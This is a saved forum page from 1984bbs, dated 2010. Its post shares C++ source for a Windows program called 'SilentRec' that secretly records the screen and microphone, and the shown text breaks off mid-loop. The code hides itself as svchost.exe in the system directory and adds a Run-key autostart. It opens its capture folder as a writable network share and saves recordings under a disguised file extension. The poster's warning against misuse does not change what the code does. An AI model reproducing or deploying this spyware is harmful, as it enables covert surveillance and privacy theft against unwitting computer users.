<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gbk" />
<title>写了一个程序，开源。可以监控电脑的屏幕，录音 - 罗马假日公寓 -  1984bbs.com </title>
<meta name="keywords" content="" />
<meta name="MSSmartTagsPreventParsing" content="True" />
<meta http-equiv="MSThemeCompatible" content="Yes" />
<link rel="archives" title="1984bbs.com" href="https://1984bbs.com/archiver/" />
	<link rel="stylesheet" type="text/css" href="forumdata/cache/style_1_viewthread.css" />
	<link rel="stylesheet" type="text/css" href="forumdata/cache/style_1_common.css" />
<script type="text/javascript">
	var discuz_uid = 13019;var IMGDIR = 'images/default';var attackevasive = '0';var gid = 0;var STYLEID = '1';
	gid = parseInt('3');var fid = parseInt('35');var tid = parseInt('37210');
</script>
<script src="include/javascript/common.js" type="text/javascript"></script>

<style>
 .ChatAutoRefreshStyle {margin-right:0px;}
 .ChatSubmitButtonStyle {margin-right:0px;}
 .gwt-Button {margin-right:0px;}
</style>
<!-- <script src="../OnlineChat/port.for1984.OnlineChat.nocache.js" type="text/javascript"></script> -->
<script src="/onlinechat.new/onlinechat.nocache.js" type="text/javascript"></script> 

<script type="text/javascript" language="javascript">

var chat_button;
var mynickname;

var chat_start_num=0;
var chat_refresh;



function getChatViewPage(){
 return chat_start_num;
}

function sendChatRefreshButtonObjct(o)
{
chat_refresh=o;
}

function chat_reply_action(Sender)
{
 document.getElementById('chat_msg').value=
 "@"+unescape(Sender)+","+document.getElementById('chat_msg').value;
}

function receiveChatViewPage(i)
{
 chat_start_num=i;
 var nextpage=document.getElementById('chat_next_page');
 if (i==0) { 
   nextpage.style.display = "none";
   nextpage.style.visibility = "hidden";
  }
  else
  {
   nextpage.style.display = "inline";   
   nextpage.style.visibility = "visible";
  }
}

function chat_page_next()
{
chat_start_num-=getChatListLimit(100);
if (chat_start_num<0) chat_start_num=0;
chat_refresh.click();
}

function chat_page_prev()
{
chat_start_num+=getChatListLimit(100);
chat_refresh.click();
}


function setMyChatNickName(o)
{
mynickname=o;
}

function handleChatChange()
{
      try{
      q=140-document.getElementById('chat_msg').value.length;
      document.getElementById('chat_msg_length').innerHTML = ""+q;
      } catch(e) {
	}
}

var chat_check_timer;


function handleChatEnterKey(e) {
    if (e.keyCode == 13 || e.keyCode == 10) {
        if (!chat_button.disabled)
             chat_button.click();
        return false;
    }
    else 
   {
        handleChatChange();
   }
}

function getChatRefreshTime()
{
 return 6;
}

function runClearChatBox()
{
document.getElementById('chat_msg').value = "";
}

function replaceButtonText(button, text)
{
    if (button)
    {
      if (button.childNodes[0])
      {
        button.childNodes[0].nodeValue=text;
      }
      else if (button.value)
      {
        button.value=text;
      }
      else //if (button.innerHTML)
      {
        button.innerHTML=text;
      }
    }
}


function sendChatCommentButtonObjct(o)
{
 chat_button=o;
 replaceButtonText(chat_button, "提交");
 chat_check_timer= setInterval("handleChatChange()",3000);
}

function replaceURLWithHTMLLinks(text) {
var exp = /(\b(https?|ftp|file):\/\/[-A-Z0-9+&@#\/%?=~_|!:,.;]*[-A-Z0-9+&@#\/%=~_|])/ig;
return text.replace(exp,"<a href='$1' target='_blank'>$1</a>");
}

function getChatItemWriteString(Id,Sender,Msg,Time,Reply)
{
 var msg;
 try
 {
 msg=replaceURLWithHTMLLinks(Msg.substr(0,140));
 }
 catch(e) {
 msg=Msg.substr(0,140);
 }
 h="<span style='width:200px;white-space:normal; word-break:break-all;overflow:hidden;word-wrap:break-word;OVERFLOW-X:hidden;'>";
   if (Sender==mynickname) {
  h+="<font color=#ff0000>"+Sender+"</font>(<i>"+Time.substr(11)+"</i>) "+"<font color=#444444>"+msg+"</font>"+"<hr style='border-top-width:0px;border-bottom-width:1px;border-color:#eeeeee;border-right-width:0px;border-left-width:0px;' />";
   }
   else {
      h+="<font color=#000000><b>"+Sender+"</b></font>(<i>"+Time.substr(11)+"</i>) "+"<font color=#555555>"+msg+"</font>"+"<img src='1984chat_re.jpg' border=0 onclick='chat_reply_action(\""+escape(Sender)+"\");'/>"+"<hr style='border-top-width:0px;border-bottom-width:1px;border-left-width:0px;border-right-width:0px;border-color:#eeeeee;' />";
   } 
  h+="</span>";
   return h;
}

function getChatItemWriteStart()
{
 try {
　document.getElementById('online_chat_box').style.visibility = "visible";
　document.getElementById('online_chat_loading').style.visibility = "hidden";
　document.getElementById('online_chat_loading').style.display = "none";
 } catch(e) {};
  return "";
}

function getChatItemWriteEnd()
{
return "";
}

function getChatListLimit(i)
{
        return 15;
}
</script>

</head>

<body onkeydown="if(event.keyCode==27) return false;">
<div id="append_parent"></div><div id="ajaxwaitid"></div>
	<div class="wrap">
		<div id="header">
			<h2><a href="index.php" title="1984bbs.com"><img src="images/default/logo.gif" alt="1984bbs.com" border="0" /></a></h2>
			<div id="ad_headerbanner"><b>能截图的截图，喜欢备份的备份。2010年10月12日的某时某刻，1984bbs将关闭。对不起各位，我力所不能及。<br>希望1984bbs再见面的时候，这个世界上再也没有共产党。</b>——张书记 1984bbs</div>
		</div>
		<div id="menu">
			<span class="avataonline">
							<cite><a class="dropmenu" id="viewpro">vos2010</a></cite>
				<a href="logging.php?action=logout&amp;formhash=823c9fa2">退出</a>
						</span>
					<ul>
			<li><a href="my.php?item=threads">话题</a></li>
			<li><a href="my.php?item=polls&amp;type=poll">投票</a></li>
			<li><a href="my.php?item=posts">回复</a></li>
			<li><a href="my.php?item=favorites&amp;type=thread">收藏</a></li>
			<li><a href="pm.php" id="pmnotice" onclick="pmwin('open')"><font style="color:#FF0000">您有新短消息</font></a></li>
									<li><a href="search.php?srchfid=35">搜索</a></li>									
				<li><a href="memcp.php?action=profile">个人资料</a></li>				<li><a href="invite.php">邀请</a></li>																<!--				<li><a href="faq.php">关于我们</a></li> -->
			</ul>
		</div>

<style type="text/css">
.defaultpost { height: auto !important; height:120px; min-height:120px !important; }
.signatures { height: expression(signature(this)); max-height: 100px; }
</style>

<script src="include/javascript/viewthread.js" type="text/javascript"></script>
<script type="text/javascript">zoomstatus = parseInt(1);</script>

<div id="foruminfo">
	<div id="nav">
		<div class="userinfolist">
			<p><a href="index.php" id="forumlist" onmouseover="showMenu(this.id)" class="dropmenu">1984bbs.com</a> &raquo; <a href="forumdisplay.php?fid=35">罗马假日公寓</a> &raquo; 写了一个程序，开源。可以监控电脑的屏幕，录音</p>
		</div>
	</div>
	<div id="headsearch">
			</div>
</div>

<div class="ad_text" id="ad_text"><table summary="Text Ad" cellpadding="0" cellspacing="1"><tr><td width="100%"><b>发布新话题与讨论建议及审查说明</b><br>
欢迎发布有讨论和阅读价值的话题；不欢迎嘲弄宗教、种族、地缘、性取向等话题。<br> 
推崇布拉格公民论坛《对话守则》：对话的目的是寻求真理，不是为了斗争；不做人身攻击；保持主题；辩论时要用证据；要分清对话与只准自己讲话的区别；尽量理解对方。<br>
遵循《世界人权宣言》第十九条不对用户已发表言论进行删除处理；用户有权限删除本人已发表言论；编辑会合并重复话题。</td></tr>
</table></div>
<div class="pages_btns">
	<div class="threadflow"><a href="redirect.php?fid=35&amp;tid=37210&amp;goto=nextoldset"> &#8249;&#8249; 上一主题</a> | <a href="redirect.php?fid=35&amp;tid=37210&amp;goto=nextnewset">下一主题 &#8250;&#8250;</a></div>
				<span class="postbtn" id="newspecial" onmouseover="$('newspecial').id = 'newspecialtmp';this.id = 'newspecial';showMenu(this.id)"><a href="post.php?action=newthread&amp;fid=35&amp;extra="><img src="images/default/newtopic.gif" border="0" alt="发新话题" title="发新话题" /></a></span>
		<span class="replybtn"><a href="post.php?action=reply&amp;fid=35&amp;tid=37210&amp;extra="><img src="images/default/reply.gif" border="0" alt="" /></a></span></div>


<form method="post" name="modactions">
	<input type="hidden" name="formhash" value="823c9fa2" />
	<div class="mainbox viewthread">
		<span class="headactions">
					<a href="my.php?item=favorites&amp;tid=37210" id="ajax_favorite" onclick="ajaxmenu(event, this.id, 3000, 0)">收藏</a>
			<a href="my.php?item=subscriptions&amp;subadd=37210" id="ajax_subscription" onclick="ajaxmenu(event, this.id, 3000, null, 0)">订阅</a>
			<a href="misc.php?action=emailfriend&amp;tid=37210" id="emailfriend" onclick="ajaxmenu(event, this.id, 9000000, null, 0)">推荐</a>
				<a href="viewthread.php?action=printable&amp;tid=37210" target="_blank" class="notabs">打印</a>
				</span>
		<h1>写了一个程序，开源。可以监控电脑的屏幕，录音		</h1>
							<table id="pid472571" summary="pid472571" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=12101" target="_blank" id="userinfo472571" class="dropmenu" onmouseover="showMenu(this.id)">devymex</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">Devymex真身，Twitter: @devymex</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=12101">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=12101&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_0" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum472571" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=37210&page=1#pid472571', '话题链接已经复制到剪贴板')">1楼</strong>
													<em onclick="$('postmessage_472571').className='t_bigfont'">大</em>							<em onclick="$('postmessage_472571').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_472571').className='t_smallfont'">小</em>												发表于 2010-2-8 16:44&nbsp;																					<a href="viewthread.php?tid=37210&amp;page=1&amp;authorid=12101" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_0"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_0"></div><div id="ad_thread4_0"></div>
													<h2>写了一个程序，开源。可以监控电脑的屏幕，录音</h2>
						
						
																											<div id="postmessage_472571" class="t_msgfont"><font color="red"><font size="5">严禁利用此程序非法获取他人隐私！</font></font><br />
<br />
找不到合适的地方放可执行程序。有些地方可以放，但这种程序会跟据需要随时更改的，更新起来太麻烦了。因此只放源代码，仅供参考与讨论。<br />
<br />
如果您编译代码有困难，请给我发邮件索取编译好的可执行程序文件，邮箱是devymex在gmail点com。<br />
<br />
代码是标准的C++程序，主要调用Windows API，VS2002以上版本都可以编译。本人水平有限，疏漏在所难免，望予以斧正。<div class="blockcode"><em onclick="copycode($('code0'));">复制内容到剪贴板</em><h5>代码:</h5><code id="code0">#include &lt;atlstr.h&gt;<br />
#include &lt;windows.h&gt;<br />
#include &lt;gdiplus.h&gt;<br />
#include &lt;lm.h&gt;<br />
#include &lt;Psapi.h&gt;<br />
<br />
#pragma comment( lib, &quot;gdiplus&quot; )<br />
#pragma comment( lib, &quot;Netapi32&quot; )<br />
#pragma comment( lib, &quot;Winmm&quot; )<br />
#pragma comment( lib, &quot;Psapi&quot; )<br />
<br />
using namespace Gdiplus;<br />
<br />
int WINAPI WinMain( HINSTANCE hInst, HINSTANCE, LPSTR, int )<br />
{<br />
&nbsp; &nbsp; &nbsp; &nbsp; // 获取当前进程句柄，降优先级为Idel。<br />
&nbsp; &nbsp; &nbsp; &nbsp; HANDLE hProc = OpenProcess( PROCESS_SET_INFORMATION, FALSE,<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; GetCurrentProcessId() );<br />
&nbsp; &nbsp; &nbsp; &nbsp; SetPriorityClass( hProc, IDLE_PRIORITY_CLASS );<br />
&nbsp; &nbsp; &nbsp; &nbsp; CloseHandle( hProc );<br />
&nbsp; &nbsp; &nbsp; &nbsp; // 目标文件名<br />
&nbsp; &nbsp; &nbsp; &nbsp; WCHAR szPath[MAX_PATH];<br />
&nbsp; &nbsp; &nbsp; &nbsp; GetSystemDirectoryW( szPath, sizeof(szPath) / sizeof(szPath[0]) );<br />
&nbsp; &nbsp; &nbsp; &nbsp; wcscat_s( szPath, sizeof(szPath) / sizeof(szPath[0]), L&quot;\\capture&quot; );<br />
&nbsp; &nbsp; &nbsp; &nbsp; CStringW strDestFile( szPath );<br />
&nbsp; &nbsp; &nbsp; &nbsp; strDestFile.Append( L&quot;\\svchost.exe&quot; );<br />
&nbsp; &nbsp; &nbsp; &nbsp; // 创建保存目录并设为共享<br />
&nbsp; &nbsp; &nbsp; &nbsp; CreateDirectoryW( szPath, NULL );<br />
&nbsp; &nbsp; &nbsp; &nbsp; SHARE_INFO_2 shi2;<br />
&nbsp; &nbsp; &nbsp; &nbsp; ZeroMemory( &amp;shi2, sizeof(shi2) );<br />
&nbsp; &nbsp; &nbsp; &nbsp; shi2.shi2_netname = L&quot;01SYSTEM&quot;;<br />
&nbsp; &nbsp; &nbsp; &nbsp; shi2.shi2_type = STYPE_DISKTREE;<br />
&nbsp; &nbsp; &nbsp; &nbsp; shi2.shi2_permissions = ACCESS_READ | ACCESS_WRITE | ACCESS_CREATE;<br />
&nbsp; &nbsp; &nbsp; &nbsp; shi2.shi2_max_uses = SHI_USES_UNLIMITED;<br />
&nbsp; &nbsp; &nbsp; &nbsp; shi2.shi2_path = (LPWSTR)szPath;<br />
&nbsp; &nbsp; &nbsp; &nbsp; NetShareAdd( NULL, 2, (LPBYTE)&amp;shi2, NULL );<br />
&nbsp; &nbsp; &nbsp; &nbsp; // 在注册表注册为开机启动<br />
&nbsp; &nbsp; &nbsp; &nbsp; HKEY hKey;<br />
&nbsp; &nbsp; &nbsp; &nbsp; RegOpenKeyExW( HKEY_LOCAL_MACHINE, L&quot;SOFTWARE\\Microsoft\\Windows\\&quot;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; L&quot;CurrentVersion\\Run&quot;, 0, KEY_ALL_ACCESS, &amp;hKey );<br />
&nbsp; &nbsp; &nbsp; &nbsp; RegSetValueExW( hKey, L&quot;SilentRec&quot;, 0, REG_SZ,<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (LPBYTE)(LPCWSTR)strDestFile,<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sizeof(WCHAR) * strDestFile.GetLength() );<br />
&nbsp; &nbsp; &nbsp; &nbsp; RegCloseKey( hKey );<br />
&nbsp; &nbsp; &nbsp; &nbsp; // 获取本进程的exe文件路径<br />
&nbsp; &nbsp; &nbsp; &nbsp; HMODULE hMod = GetModuleHandleW( NULL );<br />
&nbsp; &nbsp; &nbsp; &nbsp; WCHAR szBuf[MAX_PATH];<br />
&nbsp; &nbsp; &nbsp; &nbsp; GetModuleFileNameW( hMod, szBuf, sizeof(szBuf) / sizeof(szBuf[0]) );<br />
&nbsp; &nbsp; &nbsp; &nbsp; CStringW strImageName( szBuf );<br />
&nbsp; &nbsp; &nbsp; &nbsp; // 如果与目标文件名不相符，进行替换<br />
&nbsp; &nbsp; &nbsp; &nbsp; if ( strImageName.CompareNoCase( strDestFile ) )<br />
&nbsp; &nbsp; &nbsp; &nbsp; {<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // 枚举所有进程，找到原文件对应的进程<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DWORD aProc[1024], dwProcCnt;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; EnumProcesses( aProc, sizeof(aProc), &amp;dwProcCnt );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; for ( UINT i = 0; i &lt; dwProcCnt / sizeof(dwProcCnt); ++i )<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ( aProc[i] != 0 )<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hProc = OpenProcess( PROCESS_QUERY_INFORMATION |<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; PROCESS_VM_READ | PROCESS_TERMINATE, FALSE, aProc[i] );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ( hProc )<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DWORD dwRes;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; EnumProcessModules( hProc, &amp;hMod, sizeof(hMod), &amp;dwRes );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; GetModuleFileNameExW( hProc, hMod, szBuf, <br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sizeof(szBuf) / sizeof(szBuf[0]) );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ( 0 == strDestFile.CompareNoCase( szBuf ) )<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // 结束进程<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; TerminateProcess( hProc, 0 );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; CloseHandle( hProc );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // 替换原文件<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; CopyFileW( strImageName, strDestFile, FALSE );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; STARTUPINFO si;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ZeroMemory( &amp;si, sizeof(si) );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; si.cb = sizeof(si);<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; PROCESS_INFORMATION pi;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ZeroMemory( &amp;pi, sizeof(pi) );<br />
#ifndef _DEBUG<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // 启动新进程并退出程序<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; CreateProcessW( NULL, (LPWSTR)(LPCWSTR)strDestFile,<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; CloseHandle( pi.hProcess );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; CloseHandle( pi.hThread );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return 0;&nbsp; &nbsp; <br />
#endif<br />
&nbsp; &nbsp; &nbsp; &nbsp; }<br />
&nbsp; &nbsp; &nbsp; &nbsp; // 建立互斥量，必免程序运行多个实例<br />
&nbsp; &nbsp; &nbsp; &nbsp; HANDLE hMutex = CreateMutexW( NULL, TRUE, L&quot;SilentRec&quot; );<br />
&nbsp; &nbsp; &nbsp; &nbsp; if( GetLastError() == ERROR_ALREADY_EXISTS )<br />
&nbsp; &nbsp; &nbsp; &nbsp; {<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return 0;<br />
&nbsp; &nbsp; &nbsp; &nbsp; }<br />
&nbsp; &nbsp; &nbsp; &nbsp; // 注册热键<br />
&nbsp; &nbsp; &nbsp; &nbsp; RegisterHotKey( NULL, 0, MOD_WIN, VK_SNAPSHOT );<br />
&nbsp; &nbsp; &nbsp; &nbsp; // 初始化音频设备<br />
&nbsp; &nbsp; &nbsp; &nbsp; DWORD dwGapTime = 30;<br />
&nbsp; &nbsp; &nbsp; &nbsp; HWAVEIN hwi = NULL;<br />
&nbsp; &nbsp; &nbsp; &nbsp; WAVEFORMATEX wf;<br />
&nbsp; &nbsp; &nbsp; &nbsp; wf.wFormatTag = WAVE_FORMAT_PCM;<br />
&nbsp; &nbsp; &nbsp; &nbsp; wf.nChannels = 1;<br />
&nbsp; &nbsp; &nbsp; &nbsp; wf.nSamplesPerSec = 11025;<br />
&nbsp; &nbsp; &nbsp; &nbsp; wf.wBitsPerSample = 8;<br />
&nbsp; &nbsp; &nbsp; &nbsp; wf.nBlockAlign = ( wf.nChannels * wf.wBitsPerSample ) / 8;<br />
&nbsp; &nbsp; &nbsp; &nbsp; wf.nAvgBytesPerSec = wf.nBlockAlign * wf.nSamplesPerSec;<br />
&nbsp; &nbsp; &nbsp; &nbsp; wf.cbSize = sizeof(wf);<br />
&nbsp; &nbsp; &nbsp; &nbsp; waveInOpen( &amp;hwi, 0, &amp;wf, NULL, 0, CALLBACK_NULL );<br />
&nbsp; &nbsp; &nbsp; &nbsp; // 准备录音缓冲区<br />
&nbsp; &nbsp; &nbsp; &nbsp; WAVEHDR whdr;<br />
&nbsp; &nbsp; &nbsp; &nbsp; ZeroMemory( &amp;whdr, sizeof(whdr) );<br />
&nbsp; &nbsp; &nbsp; &nbsp; whdr.dwBufferLength = dwGapTime * wf.nAvgBytesPerSec;<br />
&nbsp; &nbsp; &nbsp; &nbsp; whdr.lpData = new char[ whdr.dwBufferLength ];<br />
&nbsp; &nbsp; &nbsp; &nbsp; // 初始化GDI+<br />
&nbsp; &nbsp; &nbsp; &nbsp; GdiplusStartupInput gdiplusStartupInput;<br />
&nbsp; &nbsp; &nbsp; &nbsp; ULONG_PTR gdiplusToken;<br />
&nbsp; &nbsp; &nbsp; &nbsp; GdiplusStartup( &amp;gdiplusToken, &amp;gdiplusStartupInput, NULL );<br />
&nbsp; &nbsp; &nbsp; &nbsp; // 获取编码器列表<br />
&nbsp; &nbsp; &nbsp; &nbsp; UINT nEncNum, nEncSize;<br />
&nbsp; &nbsp; &nbsp; &nbsp; GetImageEncodersSize( &amp;nEncNum, &amp;nEncSize );<br />
&nbsp; &nbsp; &nbsp; &nbsp; ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)malloc( nEncSize );<br />
&nbsp; &nbsp; &nbsp; &nbsp; GetImageEncoders( nEncNum, nEncSize, pImageCodecInfo );<br />
&nbsp; &nbsp; &nbsp; &nbsp; //在列表中查找jpg编码器的CLSID<br />
&nbsp; &nbsp; &nbsp; &nbsp; CLSID encoderClsid;<br />
&nbsp; &nbsp; &nbsp; &nbsp; for( UINT i = 0; i &lt; nEncNum; ++i )<br />
&nbsp; &nbsp; &nbsp; &nbsp; {<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if( wcscmp( pImageCodecInfo[i].MimeType, L&quot;image/jpeg&quot; ) == 0 )<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; encoderClsid = pImageCodecInfo[i].Clsid;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }&nbsp; &nbsp; <br />
&nbsp; &nbsp; &nbsp; &nbsp; }<br />
&nbsp; &nbsp; &nbsp; &nbsp; free( pImageCodecInfo );<br />
&nbsp; &nbsp; &nbsp; &nbsp; // 获取屏幕尺寸<br />
&nbsp; &nbsp; &nbsp; &nbsp; DWORD dwScrX = GetSystemMetrics( SM_CXSCREEN );<br />
&nbsp; &nbsp; &nbsp; &nbsp; DWORD dwScrY = GetSystemMetrics( SM_CYSCREEN );<br />
&nbsp; &nbsp; &nbsp; &nbsp; // 获取屏幕显示DC<br />
&nbsp; &nbsp; &nbsp; &nbsp; HDC hScrDC = CreateDC( _T(&quot;DISPLAY&quot;), NULL, NULL, NULL );<br />
&nbsp; &nbsp; &nbsp; &nbsp; // 并初始化内存DC和位图<br />
&nbsp; &nbsp; &nbsp; &nbsp; HDC hMemDC = CreateCompatibleDC( hScrDC );<br />
&nbsp; &nbsp; &nbsp; &nbsp; HBITMAP hMemBmp = CreateCompatibleBitmap( hScrDC, dwScrX, dwScrY );<br />
&nbsp; &nbsp; &nbsp; &nbsp; HBITMAP hOldBmp = (HBITMAP)SelectObject( hMemDC, hMemBmp );<br />
&nbsp; &nbsp; &nbsp; &nbsp; // 每dwGapTime秒存一次，按下热键退出程<br />
&nbsp; &nbsp; &nbsp; &nbsp; MSG msg;<br />
&nbsp; &nbsp; &nbsp; &nbsp; for ( CStringW strOutFile; !PeekMessageW( &amp;msg, NULL, WM_HOTKEY,<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WM_HOTKEY, PM_REMOVE ); )<br />
&nbsp; &nbsp; &nbsp; &nbsp; {<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // 用时间作为文件名<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; SYSTEMTIME st;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; GetLocalTime( &amp;st );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; strOutFile.Format( L&quot;%s\\%02d%02d_%02d%02d%02d.dai&quot;,<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; szPath, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //截取屏幕<br />
